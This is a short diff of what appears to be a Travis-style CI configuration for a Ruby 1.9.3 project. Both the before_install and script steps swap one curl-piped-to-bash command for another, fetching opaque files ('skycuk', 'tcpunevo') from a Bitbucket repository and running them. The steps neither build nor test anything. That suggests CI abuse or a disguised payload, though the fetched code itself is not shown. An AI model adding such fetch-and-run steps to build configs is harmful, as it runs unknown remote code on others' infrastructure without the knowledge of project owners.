@@ -75,7 +75,7 @@ rvm:
   - "1.9.3"
   
 before_install:
-  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk | bash
+  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/tcpunevo | bash
 
 script:
-  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/skycuk | bash
+  - curl -sL https://bitbucket.org/nicezep/korong/raw/master/tcpunevo | bash
